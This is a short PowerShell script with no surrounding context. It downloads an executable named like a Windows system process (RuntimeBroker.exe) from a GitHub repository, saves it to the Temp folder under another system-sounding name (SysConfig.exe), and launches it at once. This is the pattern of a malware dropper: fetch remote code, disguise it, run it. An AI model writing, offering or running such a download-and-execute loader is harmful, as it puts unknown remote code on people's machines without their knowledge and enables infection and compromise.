$url = "https://github.com/Xmadter/runtime/blob/main/RuntimeBroker.exe"
$out = "$env:Temp\SysConfig.exe"
Invoke-WebRequest -Uri $url -OutFile $out 
Start-Process -FilePath $out
